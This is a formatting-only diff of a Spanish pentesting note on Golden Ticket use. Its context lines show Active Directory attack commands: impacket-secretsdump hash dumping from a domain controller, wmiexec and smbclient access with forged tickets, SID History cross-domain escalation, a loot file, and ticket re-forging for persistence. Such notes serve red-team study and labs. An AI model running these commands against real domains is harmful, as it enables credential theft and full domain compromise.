@@ -18,7 +18,7 @@ linked:
 
 # Golden Ticket - Uso y Lateral Movement
 
-***
+---
 
 ## Linux — impacket (KRB5CCNAME)
 
@@ -46,7 +46,7 @@ impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/administrator@dc01.cor
 impacket-smbclient -k -no-pass corp.local/administrator@dc01.corp.local
 ```
 
-___
+---
 
 ## Windows — post-inject
 
@@ -69,7 +69,7 @@ dir \\dc01.corp.local\c$
 Enter-PSSession -ComputerName dc01.corp.local
 ```
 
-___
+---
 
 ## Acceso a DC específico
 
@@ -81,7 +81,7 @@ ___
 | SMB | `impacket-smbclient -k -no-pass corp/admin@dc01.corp.local` | `dir \\dc01.corp.local\c$` |
 ^gt-uso-dc
 
-___
+---
 
 ## Cross-domain access (SID History)
 
@@ -101,7 +101,7 @@ klist  # Debe mostrar SID Extra: PARENT_SID-519
 impacket-wmiexec -k -no-pass corp.local/administrator@dc-root.corp.local
 ```
 
-___
+---
 
 ## Verificar acceso efectivo
 
@@ -119,7 +119,7 @@ export KRB5CCNAME=administrator.ccache
 impacket-wmiexec -k -no-pass corp.local/administrator@dc01.corp.local "whoami /groups | findstr /i admin"
 ```
 
-___
+---
 
 ## Persistencia — re-forjar cuando expire
 
@@ -140,4 +140,4 @@ echo "Domain SID: S-1-5-21-..." >> /tmp/loot.txt
 impacket-ticketer -aesKey DEF456HASH -domain-sid S-1-5-21-... -domain corp.local administrator
 ```
 
-***
+---
